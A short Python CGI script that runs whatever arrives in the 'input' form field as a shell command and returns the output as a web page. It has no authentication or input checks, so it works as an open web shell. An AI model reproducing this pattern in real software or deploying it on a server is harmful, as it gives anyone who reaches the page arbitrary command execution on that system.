#!/usr/bin/python3

print("content-type:text/html\n")

import cgi
import subprocess

inp=cgi.FieldStorage()
x=inp.getvalue("input")
y=subprocess.getoutput( x)
print(y)
